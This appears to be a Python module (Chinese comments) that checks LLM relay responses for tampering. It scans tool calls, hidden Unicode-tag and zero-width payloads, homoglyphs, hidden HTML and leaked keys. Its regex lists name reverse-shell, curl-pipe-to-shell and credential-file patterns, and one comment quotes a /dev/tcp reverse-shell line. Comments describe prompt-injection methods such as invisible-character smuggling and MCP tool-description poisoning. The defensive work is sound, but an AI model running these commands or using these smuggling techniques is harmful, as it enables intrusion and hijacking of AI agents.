# SPDX-License-Identifier: DaoTi-Research-1.0
# Copyright (c) 2026 独立研究者，知白
# 本文件受道体研究许可证 v1.0 约束，禁止逆向工程和再分发
# 详见 LICENSE 文件

"""第二层：响应侧完整性验证（verifier）。

职责：在中转站返回内容交给用户**之前**，验证中转站是否篡改了模型返回。

检测维度（5 类）：
1. **Tool Call 危险参数**：tool call 是否包含 `rm -rf` / 陌生 URL / `/etc/passwd`
2. **系统提示词注入**：返回中是否出现系统提示词泄露迹象
3. **响应模式异常**：同一会话中长度/结构是否突变（3σ）
4. **隐藏指令**：是否包含零宽字符等不可见字符
5. **敏感信息泄露**：中转站是否返回了不该返回的内容

复用策略：
- 第 2/5 项直接复用企业版 `daoti_xuandun._check_output.OutputGuardrail`
- 第 1/3/4 项为个人版新增（中转站特有威胁，企业版不需要）
"""

from __future__ import annotations

import json
import logging
import re
import statistics
from typing import Any, Dict, List, Optional, Tuple

from ..types import (
    Action,
    SecurityLevel,
    VerificationFinding,
    VerifyResult,
)

logger = logging.getLogger("xuandun-personal.verifier")


# ══════════════════════════════════════════════════════════════
# 规则加载（★ v0.1.0 判据外置）
#
# 下列 _BUILTIN_* 表是**回退集**：规则文件缺失或损坏时才使用。
# 正常路径走 rules/detection_rules.yaml —— 改一条规则不用重编打包。
# ══════════════════════════════════════════════════════════════
from ..rules import load_ruleset  # noqa: E402

_RULES = load_ruleset()
logger.info("检测规则来源：%s（v%s）",
            "规则文件" if _RULES.from_file else "内置回退集",
            _RULES.version)


# ══════════════════════════════════════════════════════════════
# 第 1 类：Tool Call 危险参数检测
# ══════════════════════════════════════════════════════════════

# 危险命令模式（继承企业版 _DANGER_COMMAND_PATTERNS 思路）
# ★ 内置回退集；实际优先取 rules/detection_rules.yaml
_BUILTIN_DANGEROUS_COMMANDS: List[Tuple[str, str]] = [
    (r"\brm\s+-[rf]{1,2}\b", "递归删除命令 rm -rf"),
    (r"\bmkfs(\.\w+)?\b", "文件系统格式化 mkfs"),
    (r"\bdd\s+if=", "磁盘覆写 dd if="),
    (r"\bchmod\s+777\b", "权限全开 chmod 777"),
    (r":\(\)\s*\{.*\};\s*:", "fork 炸弹"),
    (r"\bformat\s+[a-z]:", "Windows 磁盘格式化"),
    (r"\bdel\s+/[sfq]\b", "Windows 递归删除"),
    (r"\bDrop\s+(table|database)\b", "SQL 删库"),
    (r"\btruncate\s+table\b", "SQL 截断表"),
    (r"\beval\s*\(", "动态代码执行 eval"),
    (r"\bexec\s*\(", "动态代码执行 exec"),
    (r"\b(?:curl|wget)\b[^\n|;]*\|\s*(?:ba)?sh\b", "下载并执行远程脚本（curl|sh）"),
    (r"\b(?:curl|wget)\b[^\n]*\b(?:\.onion|ngrok|pipedream|webhook\.site)\b", "向可疑地址发起请求"),
    (r"\bnc\b\s+-[a-z]*e\b|\bnetcat\b\s+-[a-z]*e\b", "反弹 shell（nc -e）"),
    # ★ 无 nc 的反弹 shell：bash/zsh/sh 内建 /dev/tcp 重定向。
    #   这是现代脚本里最常见的写法之一（不依赖任何外部二进制），
    #   原规则表只覆盖 nc -e，实测漏放：
    #     bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
    (r"/dev/(?:tcp|udp)/[\w.:-]+", "反弹 shell（内建 /dev/tcp 重定向）"),
    (r"\b(?:ba|z|k|da)?sh\b\s+-i\b[^\n]*&", "反弹 shell（交互式 shell 重定向）"),
    (r"\bpython\s+-c\b[^\n]*(?:socket|subprocess|os\.system)", "Python 内联执行危险操作"),
    (r"\bbase64\s+-d\b[^\n]*\|\s*(?:ba)?sh\b", "Base64 解码后执行"),
]

# 敏感文件路径模式
_BUILTIN_SENSITIVE_PATHS: List[Tuple[str, str]] = [
    (r"/etc/(passwd|shadow|sudoers)\b", "读取系统账户文件"),
    (r"\.ssh/(id_rsa|id_ed25519|authorized_keys)\b", "读取 SSH 私钥"),
    (r"\.aws/credentials\b", "读取 AWS 凭证"),
    (r"\.env(\.|$|\s)", "读取环境变量文件"),
    (r"\.docker/config\.json\b", "读取 Docker 凭证"),
    (r"\.git/config\b", "读取 Git 配置"),
    (r"\.npmrc\b|\.pypirc\b", "读取包管理凭证"),
    (r"cookies?\.txt\b|login\.json\b", "读取浏览器凭证"),
]

# 危险网络目标
_BUILTIN_DANGEROUS_URLS: List[Tuple[str, str]] = [
    (r"https?://(?!localhost|127\.0\.0\.1)[\w.-]*(?:ngrok|pipedream|requestbin|webhook\.site|burpcollaborator|interact\.sh)\.(?:com|net|io|sh)", "数据外泄测试平台 URL"),
    (r"https?://[\w.-]*\.(?:tk|ml|ga|cf|gq)\b", "免费域名（常见于 C2）"),
]

# 危险网络方法
_DANGEROUS_HTTP_METHODS = {"POST", "PUT", "DELETE", "PATCH"}


def _rules(section: str) -> List[Tuple[Any, str]]:
    """取某章节规则：优先规则文件，为空则回退内置表。

    返回 (已编译正则, 标签)，与原 (pattern_str, label) 用法兼容 ——
    调用方只需把 re.search(pat, ...) 换成 pat.search(...)。
    """
    pairs = _RULES.pairs(section)
    if pairs:
        return pairs
    src = {
        "dangerous_commands": _BUILTIN_DANGEROUS_COMMANDS,
        "sensitive_paths": _BUILTIN_SENSITIVE_PATHS,
        "dangerous_urls": _BUILTIN_DANGEROUS_URLS,
    }.get(section, [])
    return [(re.compile(p, re.IGNORECASE), l) for p, l in src]


def _check_tool_calls(payload: Any, text: str) -> List[VerificationFinding]:
    """检测 tool call 中的危险参数。

    双重检测：
    1. 解析 JSON 结构中的 tool_calls 数组
    2. 正则扫描原始文本（应对中转站返回非标准格式）
    """
    findings: List[VerificationFinding] = []
    seen_commands: set = set()

    # ── 结构化检测：提取所有 tool call 的参数文本 ──
    tool_call_texts: List[Tuple[str, str]] = []  # (tool_name, arguments_text)

    def _walk(obj: Any) -> None:
        """递归遍历 JSON，提取 tool_calls 结构。"""
        if isinstance(obj, dict):
            # OpenAI 格式：{"tool_calls": [{"function": {"name":..., "arguments": "..."}}]}
            if "tool_calls" in obj and isinstance(obj["tool_calls"], list):
                for tc in obj["tool_calls"]:
                    fn = tc.get("function", {}) if isinstance(tc, dict) else {}
                    name = fn.get("name", "unknown")
                    args = fn.get("arguments", "")
                    if isinstance(args, (dict, list)):
                        args = json.dumps(args, ensure_ascii=False)
                    tool_call_texts.append((str(name), str(args)))
            # Anthropic 格式：{"content": [{"type": "tool_use", "name":..., "input": {...}}]}
            if obj.get("type") == "tool_use":
                name = obj.get("name", "unknown")
                inp = obj.get("input", "")
                if isinstance(inp, (dict, list)):
                    inp = json.dumps(inp, ensure_ascii=False)
                tool_call_texts.append((str(name), str(inp)))
            for v in obj.values():
                _walk(v)
        elif isinstance(obj, list):
            for item in obj:
                _walk(item)

    try:
        _walk(payload)
    except Exception:  # noqa: BLE001 — 结构异常不应影响检测
        logger.debug("tool call 结构遍历异常，退回纯文本检测")

    # ── 对每个 tool call 参数做危险模式匹配 ──
    dangerous_cmds = _rules("dangerous_commands")
    sensitive_paths = _rules("sensitive_paths")
    dangerous_urls = _rules("dangerous_urls")

    for tool_name, args_text in tool_call_texts:
        for pattern, label in dangerous_cmds:
            m = pattern.search(args_text)
            if m and m.group(0) not in seen_commands:
                seen_commands.add(m.group(0))
                findings.append(
                    VerificationFinding(
                        category="tool_call_dangerous",
                        severity="high",
                        detail=f'Tool Call "{tool_name}" 参数包含{label}：{m.group(0)[:40]}',
                        evidence=_mask_evidence(args_text, m.start()),
                    )
                )

        for pattern, label in sensitive_paths:
            m = pattern.search(args_text)
            if m and f"path:{m.group(0)}" not in seen_commands:
                seen_commands.add(f"path:{m.group(0)}")
                findings.append(
                    VerificationFinding(
                        category="tool_call_dangerous",
                        severity="high",
                        detail=f'Tool Call "{tool_name}" 试图{label}：{m.group(0)[:40]}',
                        evidence=_mask_evidence(args_text, m.start()),
                    )
                )

        for pattern, label in dangerous_urls:
            m = pattern.search(args_text)
            if m and f"url:{m.group(0)}" not in seen_commands:
                seen_commands.add(f"url:{m.group(0)}")
                findings.append(
                    VerificationFinding(
                        category="tool_call_dangerous",
                        severity="high",
                        detail=f'Tool Call "{tool_name}" 请求{label}：{m.group(0)[:60]}',
                        evidence=_mask_evidence(args_text, m.start()),
                    )
                )

    # ── 兜底：原始文本扫描（应对中转站返回非标准 tool call 格式）──
    if not tool_call_texts:
        for pattern, label in dangerous_cmds:
            m = pattern.search(text)
            if m and m.group(0) not in seen_commands:
                seen_commands.add(m.group(0))
                findings.append(
                    VerificationFinding(
                        category="tool_call_dangerous",
                        severity="high",
                        detail=f"响应中包含{label}：{m.group(0)[:40]}",
                        evidence=_mask_evidence(text, m.start()),
                    )
                )

    return findings


def _mask_evidence(text: str, pos: int, window: int = 60) -> str:
    """提取证据片段并做基本脱敏（避免二次泄露）。"""
    start = max(0, pos - window // 2)
    end = min(len(text), pos + window)
    snippet = text[start:end].replace("\n", " ")
    if start > 0:
        snippet = "..." + snippet
    if end < len(text):
        snippet = snippet + "..."
    return snippet


# ══════════════════════════════════════════════════════════════
# 第 4 类：隐藏指令检测
# ══════════════════════════════════════════════════════════════

# 零宽/不可见字符（使用转义形式，避免源码中的不可见字符被工具静默修改）
_INVISIBLE_CHARS: List[Tuple[str, str]] = [
    (r"[\u200b\u200d\u2060\ufeff]", "零宽空格/连接符"),
    (r"\u00ad", "软连字符（防关键词绕过）"),
    (r"\u180e", "蒙古文零宽字符（常见于提示注入）"),
    (r"[\x00-\x08\x0b\x0c\x0e-\x1f]", "控制字符"),
    (r"[\u202a-\u202e\u2066-\u2069]", "双向文本控制符（可欺骗人工阅读）"),
    # ★ 补零宽字符遗漏项：U+200C（ZWNJ）此前未覆盖，
    #   而它与 U+200B/U+200D 组合正是二进制隐写的标准载体
    #   （U+200B=0 / U+200C=1 / U+200D 终止符，Knostic 2025-10 实证）
    (r"[\u200c\u2061\u2062\u2063\u2064]", "零宽连接符/方向标记"),
]

# ★★ Unicode Tags 块（U+E0000–U+E007F）—— 最高危的隐藏指令载体 ★★
#
# 为什么必须单独检测：
#   该块字符在浏览器、终端、编辑器、聊天界面里**渲染为完全空白**，
#   人眼审查看到的是正常内容，而 LLM tokenizer 会把它还原成可读指令。
#   编码方式：每个字符 = 0xE0000 + ASCII 码点
#     U+E0041 → 'A'，U+E0061 → 'a'，U+E007B → '{'
#   任何明文都能无中生有地塞进一段看起来干净的文本。
#
# 已知实战（2025-2026）：
#   - wunderwuzzi 的 ASCII Smuggler（2024-01 公开工具）
#   - MCP 工具描述投毒：声称做加法的工具藏指令，读 ~/.cursor/mcp.json 外传 SSH 私钥
#   - CVE-2025-53773（GitHub Copilot RCE）链路中确认可触发
#   - StegoAttack 论文：不可见编码对外部安全分类器的绕过率 >92%
#
# ★ 判据不能用「出现即高危」：单个 Tags 字符可能来自正常的语言标注
#   （ISO 语言标签的合法用途）。但**连续多个 Tags 字符必然是编码载荷** ——
#   正常文本不会有连续十几个不可见标签字符。
_UNICODE_TAG_BLOCK = re.compile(r"[\U000E0000-\U000E007F]")
_UNICODE_TAGS_PATTERN = re.compile(r"(?:[\U000E0000-\U000E007F]){4,}")
# 变体选择符 VS1-16（U+FE00-FE0F）也可承载隐写（U+E0100-E01EF 区块同理）
_VARIATION_SELECTOR_BLOCK = re.compile(r"[\U000E0100-\U000E01EF]|\uFE0E|\uFE0F")
_VARIATION_SELECTOR_RUN = re.compile(r"(?:[\U000E0100-\U000E01EF]|\uFE0E|\uFE0F){4,}")

# 同形异义字（Homoglyph）—— 用西里尔字母冒充拉丁字母绕过关键词过滤
#
# ★ 实测成功率不低：Capital One 系统研究（2025-08，7 个开源模型 / 2800+ 实例）
#   测量同形异义字攻击成功率 42.1%–58.7%。Cyrillic а(U+0430) 与 Latin a
#   肉眼完全无法区分，而基于拉丁字节序列的关键词匹配会被直接绕过。
#
# ★ 防御手段是 NFKC 归一化 —— 它把兼容等价字符折叠为规范形式，
#   Cyrillic а → Latin a，此后常规关键词规则即可命中。
#   （据 Elastic 研究，普通规则表里根本没做这件事。）
_HOMOGLYPH_SUSPECTS = (
    # 西里尔字母（U+0400–U+04FF）中与拉丁字母视觉等同的常用子集
    "аеорсухАЕОРСТХ"      # а е о р с у х
    "іјһАВЕКМНОРСТХ"
    "ԁһАВЕКМНОРСТХ"      # ԁ һ
    "ѕАВЕІКМНОРСТХ"      # ѕ
    "ԛԝАВЕКМНОРСТХ"      # ԛ ԝ
)

# HTML 隐藏元素（视觉不可见但机器可读）
_HTML_HIDDEN: List[Tuple[str, str]] = [
    (r"<[^>]*style\s*=\s*[\"'][^\"']*(?:display\s*:\s*none|visibility\s*:\s*hidden|font-size\s*:\s*0)",
     "HTML 隐藏元素"),
    (r"<!--(?!-->)[\s\S]{0,500}?-->", "HTML 注释（可能含隐藏指令）"),
    (r"<meta[^>]*http-equiv\s*=\s*[\"']refresh", "HTML meta 刷新跳转"),
]


def _decode_unicode_tags(text: str) -> str:
    """把 Unicode Tags 块编码还原为明文。

    编码规则：每个 Tags 字符 = 0xE0000 + ASCII 码点。
    这不是猜测，是 Unicode 标准的定义（Tags 块镜像 ASCII 可打印区）。
    还原结果用于给用户看清楚「到底藏了什么」——只报「发现不可见字符」
    等于让用户仍然不知道敌人写了什么。
    """
    out: List[str] = []
    for ch in text:
        cp = ord(ch)
        if 0xE0000 <= cp <= 0xE007F:
            out.append(chr(cp - 0xE0000))
    return "".join(out)


def _check_unicode_steganography(text: str) -> List[VerificationFinding]:
    """检测 Unicode 隐写载荷（Tags 块 / 变体选择符 / 同形异义字）。

    这三类是 2025-2026 实证的 stealth 攻击主流，共同特点是
    **人眼完全看不见**，却能被模型 tokenizer 还原成可执行指令。
    """
    findings: List[VerificationFinding] = []

    # ① Unicode Tags 块：连续 4 个以上即判定为编码载荷
    tags_run = _UNICODE_TAGS_PATTERN.search(text)
    if tags_run:
        decoded = _decode_unicode_tags(tags_run.group(0))
        # 只展示可打印部分，避免把控制字符回显到日志里
        visible = "".join(c for c in decoded if c.isprintable() and c != " ")
        findings.append(
            VerificationFinding(
                category="unicode_steganography",
                severity="high",
                detail=(
                    f"响应含 {len(tags_run.group(0))} 个连续 Unicode Tags 块字符"
                    f"（U+E0000–U+E007F），人眼渲染为空白但模型可读，"
                    f"解码内容为：{visible[:80]!r}"
                ),
                evidence=visible[:60],
            )
        )

    # ② 变体选择符连发（U+E0100–U+E01EF / VS1-16）
    vs_run = _VARIATION_SELECTOR_RUN.search(text)
    if vs_run:
        findings.append(
            VerificationFinding(
                category="unicode_steganography",
                severity="high",
                detail=(
                    f"响应含 {len(vs_run.group(0))} 个连续变体选择符"
                    f"（U+E0100–U+E01EF / VS1-16），可用于隐写不可见指令"
                ),
                evidence="",
            )
        )

    # ③ 同形异义字：西里尔字母混入**拉丁为主的**文本
    #
    # ★ 判据必须是「西里尔占比」而非「绝对数量」：
    #   俄语正文里夹一个产品名（Rust / Python / GitHub）就会混进几个拉丁字母，
    #   若按「拉丁字母 ≥ 8 个」判定，正常的
    #   「Это обычный ответ о ... в Rust.」会被误报 ——
    #   实测正是在这一条上翻车。
    #
    #   正确逻辑：同形异义字攻击的前提是「这段话_model 是按拉丁语义读的」，
    #   所以西里尔字母才是少数派。俄语正文恰好相反（西里尔占绝大多数），
    #   两者可以用占比干净地分开。
    letters = [c for c in text if c.isalpha()]
    if len(letters) >= 12:
        cyr = sum(1 for c in letters if 0x400 <= ord(c) <= 0x4FF)
        suspects = [c for c in letters if c in _HOMOGLYPH_SUSPECTS]
        # 西里尔占比低于 25% 却出现了同形异义字 → 拉丁文本被掺入假字母
        if suspects and cyr / len(letters) < 0.25:
            uniq = "".join(sorted(set(suspects)))
            findings.append(
                VerificationFinding(
                    category="unicode_steganography",
                    severity="high",
                    detail=(
                        f"拉丁文本中混入 {len(suspects)} 个西里尔同形异义字（{uniq!r}），"
                        f"肉眼无法区分，可用于绕过关键词过滤"
                    ),
                    evidence="",
                )
            )

    return findings


def _check_hidden_instructions(text: str) -> List[VerificationFinding]:
    """检测隐藏指令（Unicode 隐写 + 零宽字符 + HTML 隐藏元素）。"""
    findings: List[VerificationFinding] = []

    # ★ Unicode 隐写优先级最高：它是唯一「解码后能直接给出敌人原文」的一类
    findings.extend(_check_unicode_steganography(text))

    for pattern, label in _INVISIBLE_CHARS:
        matches = re.findall(pattern, text)
        if matches:
            chars = "".join(sorted(set(matches)))
            findings.append(
                VerificationFinding(
                    category="hidden_instruction",
                    severity="high" if len(matches) >= 3 else "medium",
                    detail=f"响应包含 {len(matches)} 个{label}（{chars!r}），可能存在隐藏指令",
                    evidence=_mask_evidence(text, text.find(matches[0])),
                )
            )

    for pattern, label in _HTML_HIDDEN:
        m = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
        if m:
            findings.append(
                VerificationFinding(
                    category="hidden_instruction",
                    severity="high",
                    detail=f"响应包含{label}，人眼不可见但模型可读",
                    evidence=_mask_evidence(text, m.start(), window=80),
                )
            )

    return findings


# ══════════════════════════════════════════════════════════════
# 第 3 类：响应模式异常（长度/结构突变 3σ）
# ══════════════════════════════════════════════════════════════


class PatternTracker:
    """会话级响应模式追踪器（检测中转站的条件触发型篡改）。

    攻击特征：中转站在前 N 次调用中表现正常（建立信任），
    在第 N+1 次突然返回恶意内容。长度/结构突变是重要信号。
    """

    def __init__(self, window_size: int = 10, sigma_threshold: float = 3.0):
        self._window_size = window_size
        self._sigma = sigma_threshold
        self._lengths: Dict[str, List[int]] = {}     # session -> 长度历史
        self._structures: Dict[str, List[str]] = {}  # session -> 结构签名历史

    def _structure_signature(self, text: str) -> str:
        """提取文本结构签名（字符类序列的粗粒度指纹）。"""
        classes: List[str] = []
        for ch in text[:200]:
            if ch.isdigit():
                classes.append("N")
            elif ch.isalpha():
                classes.append("A")
            elif ch in " \t":
                classes.append(" ")
            elif ch in "\n\r":
                classes.append("\n")
            else:
                classes.append(".")
        # 压缩连续同类字符
        sig: List[str] = []
        for c in classes:
            if not sig or sig[-1] != c:
                sig.append(c)
        return "".join(sig)

    def check(self, session_id: str, text: str) -> List[VerificationFinding]:
        """检查本次响应是否相对历史基线突变。"""
        findings: List[VerificationFinding] = []
        length = len(text)
        signature = self._structure_signature(text)

        lengths = self._lengths.setdefault(session_id, [])
        structs = self._structures.setdefault(session_id, [])

        # 历史不足 3 次不检测
        if len(lengths) >= 3:
            mean_len = statistics.mean(lengths)
            std_len = statistics.pstdev(lengths)

            # 长度突变检测
            if std_len < 1e-6:
                # 标准差为 0：本次长度与历史完全不同即为异常
                if length > mean_len * 2 and mean_len > 0:
                    findings.append(
                        VerificationFinding(
                            category="length_anomaly",
                            severity="medium",
                            detail=(
                                f"响应长度异常：本次 {length} 字符，"
                                f"历史稳定在 {int(mean_len)} 字符（超过 2 倍）"
                            ),
                            evidence="",
                        )
                    )
            else:
                sigma = (length - mean_len) / std_len
                if abs(sigma) > self._sigma:
                    direction = "突然变长" if sigma > 0 else "突然变短"
                    findings.append(
                        VerificationFinding(
                            category="length_anomaly",
                            severity="medium" if abs(sigma) < 5 else "high",
                            detail=(
                                f"响应长度{direction}：本次 {length} 字符，"
                                f"偏离历史均值 {mean_len:.0f} 达 {sigma:.1f}σ"
                            ),
                            evidence="",
                        )
                    )

            # 结构突变检测
            if len(structs) >= 3:
                recent = structs[-5:]
                common = max(set(recent), key=recent.count)
                # 本次结构与近期主流结构差异过大
                if common and _structure_distance(signature, common) > 0.6:
                    findings.append(
                        VerificationFinding(
                            category="structure_anomaly",
                            severity="medium",
                            detail="响应结构与历史显著不同（字符类分布突变），中转站可能篡改了内容类型",
                            evidence=signature[:60],
                        )
                    )

        # 记录本次（限制窗口）
        lengths.append(length)
        if len(lengths) > self._window_size:
            lengths.pop(0)
        structs.append(signature)
        if len(structs) > self._window_size:
            structs.pop(0)

        return findings

    def clear(self, session_id: str) -> None:
        """清除会话基线。"""
        self._lengths.pop(session_id, None)
        self._structures.pop(session_id, None)


def _structure_distance(a: str, b: str) -> float:
    """结构签名距离（0=相同，1=完全不同）。

    用归一化编辑距离的补数作为距离。
    """
    if not a or not b:
        return 1.0
    # 快速长度差异判断
    len_diff = abs(len(a) - len(b)) / max(len(a), len(b))
    if len_diff > 0.8:
        return 1.0
    # 简化的公共子序列比例
    common = 0
    i = j = 0
    while i < len(a) and j < len(b):
        if a[i] == b[j]:
            common += 1
            i += 1
            j += 1
        elif a[i] < b[j]:
            i += 1
        else:
            j += 1
    similarity = common / max(len(a), len(b))
    return 1.0 - similarity


# ══════════════════════════════════════════════════════════════
# 验证器主类
# ══════════════════════════════════════════════════════════════


class ResponseVerifier:
    """响应侧完整性验证器。

    复用企业版输出护栏（提示词注入 + 敏感泄露），
    新增中转站特有检测（tool call 危险参数 / 隐藏指令 / 模式突变）。
    """

    def __init__(
        self,
        level: str = SecurityLevel.BALANCED.value,
        enable_pattern_check: bool = True,
    ) -> None:
        self._level = level
        self._enable_pattern_check = enable_pattern_check
        self._tracker = PatternTracker()

        # ── 复用企业版输出护栏（延迟导入，避免循环依赖）──
        self._output_guardrail = None
        self._guardrail_available = False
        self._try_load_guardrail()

    def _try_load_guardrail(self) -> None:
        """尝试加载企业版输出护栏。"""
        try:
            from daoti_xuandun.xuandun import XuanDun
            from daoti_xuandun.config import DefenseLevel, XuanDunConfig

            config = XuanDunConfig.preset(DefenseLevel.STANDARD)
            config.enable_output_guardrail = True
            self._shield = XuanDun(config=config)
            self._output_guardrail = self._shield.output_guardrail
            self._guardrail_available = self._output_guardrail is not None
            logger.info("企业版输出护栏加载成功（复用提示词注入 + 敏感泄露检测）")
        except Exception as e:  # noqa: BLE001 — 复用失败不应阻断个人版
            self._guardrail_available = False
            logger.warning("企业版输出护栏加载失败，仅启用个人版自研检测: %s", e)

    def set_level(self, level: str) -> None:
        if level not in (s.value for s in SecurityLevel):
            raise ValueError(f"无效的安全级别: {level}")
        self._level = level

    def set_pattern_check(self, enabled: bool) -> None:
        """开关响应模式异常检测（★ P2-15：让配置项真正生效）。"""
        self._enable_pattern_check = bool(enabled)
        logger.info("响应模式异常检测已%s", "开启" if enabled else "关闭")

    def _threshold_for(self, severity: str) -> str:
        """返回某严重程度在当前安全级别下的整体处置。"""
        if severity == "high":
            return {
                "lenient": Action.ALERT.value,
                "balanced": Action.BLOCK.value,
                "strict": Action.BLOCK.value,
            }[self._level]
        if severity == "medium":
            return {
                "lenient": Action.PASS.value,
                "balanced": Action.ALERT.value,
                "strict": Action.BLOCK.value,
            }[self._level]
        return Action.PASS.value

    def verify(
        self,
        content: str,
        session_id: str = "default",
        payload: Any = None,
        baseline: Any = None,
    ) -> VerifyResult:
        """验证响应内容。

        Args:
            content: 响应文本（纯文本内容部分）
            session_id: 会话标识（用于模式基线）
            payload: 完整响应结构（用于 tool call 检测），可为 str/dict
            baseline: RequestBaseline（请求侧可信对照物）。传入后
                额外执行结构差分检测 —— 这是唯一能防住
                「载荷不含任何被禁词」那类攻击的判据来源。

        Returns:
            VerifyResult：含整体处置、最高严重程度、发现项列表
        """
        findings: List[VerificationFinding] = []

        # ① Tool Call 危险参数
        if payload is not None:
            findings.extend(_check_tool_calls(payload, content))
        else:
            findings.extend(_check_tool_calls(None, content))

        # ② 系统提示词注入 + ⑤ 敏感泄露（复用企业版输出护栏）
        if self._guardrail_available and self._output_guardrail is not None:
            findings.extend(self._check_with_guardrail(content, session_id))

        # ③ 响应模式异常
        if self._enable_pattern_check:
            findings.extend(self._tracker.check(session_id, content))

        # ④ 隐藏指令
        findings.extend(_check_hidden_instructions(content))

        # ⑥ ★ v0.1.0 结构差分（请求 ↔ 响应）
        #   前五类判据都是「响应文本自身长得像不像攻击」，
        #   而中转站的演化方向是不含任何被禁词 —— 实测 9/13 绕过。
        #   这一类的判据来源是请求本身，不依赖被评判的模型，
        #   因此不存在循环论证。
        findings.extend(self._check_against_baseline(content, payload, baseline))

        if not findings:
            return VerifyResult(action=Action.PASS.value, severity="low")

        # 综合：取最高严重程度，按当前级别映射整体处置
        order = {"low": 0, "medium": 1, "high": 2}
        max_sev = max(findings, key=lambda f: order.get(f.severity, 0)).severity
        overall = self._threshold_for(max_sev)

        return VerifyResult(
            action=overall,
            severity=max_sev,
            findings=findings,
            blocked_reason=(
                findings[0].detail if overall == Action.BLOCK.value else None
            ),
        )

    def _check_with_guardrail(
        self, content: str, session_id: str
    ) -> List[VerificationFinding]:
        """调用企业版输出护栏做检测。"""
        findings: List[VerificationFinding] = []
        try:
            decision = self._output_guardrail.check_output(
                content, session_state={}, session_id=session_id
            )
        except Exception as e:  # noqa: BLE001 — 复用层异常降级
            logger.warning("输出护栏调用异常，跳过该项检测: %s", e)
            return findings

        risk = getattr(decision, "risk_level", "low")
        reason = getattr(decision, "reason", "") or ""
        action = getattr(decision, "action", "")

        # ★ P0-4 修复：原实现用 `"敏感" in reason` 关键词判定分类，
        #   但企业版 8 个 reason 取值中仅 2 个含「敏感」，且这 2 个属 redact
        #   （打码）分支，与本处进入条件 risk in (high, medium) 几乎不重合
        #   → 导致 sensitive_leak 在整个代码库永远不会被产生。
        #   改用「结构化判定 + 本地正则兜底」双通道，不依赖 reason 文案。
        category = self._classify_guardrail_hit(content, risk, action, reason)

        if category is None:
            return findings

        severity = "high" if risk == "high" else "medium"
        findings.append(
            VerificationFinding(
                category=category,
                severity=severity,
                detail=f"[企业版护栏] {reason}" if reason else "[企业版护栏] 检测到风险内容",
                evidence=_mask_evidence(content, 0, window=50),
            )
        )

        return findings

    # 提示词注入特征（系统提示词/配置泄露方向）
    _PROMPT_INJECT_RE = re.compile(
        r"(?:my\s+instructions?|your\s+configuration|system\s+prompt|"
        r"系统提示词|系统指令|系统设置|内部指令)",
        re.IGNORECASE,
    )
    # 敏感信息外泄特征（密钥/凭证形态出现在输出中）
    # ★ v0.1.0 修复：字符类原为 [A-Za-z0-9]，不含 '-'，
    #   匹配不到 sk-proj- / sk-svcacct- 这类带第二段前缀的现代密钥
    #   （实测泄漏样本被判成 system_prompt_inject，分类错误）。
    #   sanitizer.py 的同类规则早已含 '\-'，两侧此前不一致。
    _SENSITIVE_LEAK_RE = re.compile(
        r"(?:sk-[A-Za-z0-9\-_]{20,}|AKIA[0-9A-Z]{16}|"
        r"-----BEGIN\s+\w*\s*PRIVATE KEY|"
        r"eyJ[A-Za-z0-9\-_]{8,}\.eyJ)",
    )

    @classmethod
    def _classify_guardrail_hit(
        cls, content: str, risk: str, action: str, reason: str
    ) -> Optional[str]:
        """判定企业版护栏命中的类别。

        返回 'system_prompt_inject' / 'sensitive_leak' / None。
        判定顺序：本地内容特征优先（最可靠），reason 关键词作为次要信号。
        """
        # ① 本地正则（最可靠，不依赖 reason 文案）
        if cls._SENSITIVE_LEAK_RE.search(content):
            return "sensitive_leak"
        if cls._PROMPT_INJECT_RE.search(content):
            return "system_prompt_inject"

        # ② action 语义：redact 说明护栏认定内容含敏感信息
        if action == "redact":
            return "sensitive_leak"

        # ③ reason 关键词兜底（多语言）
        lowered = reason or ""
        if any(k in lowered for k in ("敏感", "打码", "sensitive", "redact")):
            return "sensitive_leak"
        if any(k in lowered for k in ("系统", "指令", "提示词", "泄露方向", "prompt")):
            return "system_prompt_inject"

        # ④ 无法判定 → 按拦截语义归为提示词注入（护栏高危拦截主要针对系统信息/违规）
        if risk == "high":
            return "system_prompt_inject"
        return None

    def _check_against_baseline(
        self, content: str, payload: Any, baseline: Any
    ) -> List[VerificationFinding]:
        """结构差分检测：响应是否偏离了请求本身声明的内容。

        ★ 这是 v0.1.0 最重要的新增。前五类检测的判据都是
          「响应文本自身长得像不像攻击」，判据来源是被检测对象本身；
          这里的判据来源是**请求** —— 一个中转站无法伪造的可信对照物。

        无 baseline 时静默跳过（不产生误报），保证旧调用路径不受影响。
        """
        if baseline is None:
            return []

        try:
            from .baseline import diff_against_baseline, extract_response_facts

            facts = extract_response_facts(payload, content)
            raw = diff_against_baseline(baseline, facts, content)
        except Exception as e:  # noqa: BLE001 — 差分失败不应阻断主流程
            logger.warning("结构差分异常，跳过该项检测: %s", e)
            return []

        return [
            VerificationFinding(
                category=item["category"],
                severity=item["severity"],
                detail=item["detail"],
                evidence=item.get("evidence", ""),
            )
            for item in raw
        ]

    def clear_session(self, session_id: str) -> None:
        """清除会话基线（设置页「重置学习数据」用）。"""
        self._tracker.clear(session_id)

    def get_stats(self) -> Dict[str, Any]:
        """返回验证器状态（诊断用）。

        ★ 规则来源与护栏可用性必须对外可见：
          两者都是「静默降级」——规则文件缺失会回退到内置最小集、
          企业版护栏缺失会让提示词注入与敏感泄露两类检测完全失效。
          若这些只在日志里出现，用户看到的仍是「防护中」，
          却在用一个能力大幅缩减的版本。这是比误报更危险的状态。
        """
        rule_counts = _RULES.stats()
        return {
            "level": self._level,
            "guardrail_available": self._guardrail_available,
            # 护栏缺失时明确给出「失效了哪两层」，而非一个布尔
            "guardrail_missing_layers": (
                [] if self._guardrail_available
                else ["system_prompt_inject", "sensitive_leak"]
            ),
            "pattern_check_enabled": self._enable_pattern_check,
            "tracked_sessions": len(self._tracker._lengths),
            "rules_source": "file" if _RULES.from_file else "builtin_fallback",
            "rules_version": _RULES.version,
            "rules_count": sum(rule_counts.values()),
            "degraded": (not _RULES.from_file) or (not self._guardrail_available),
        }
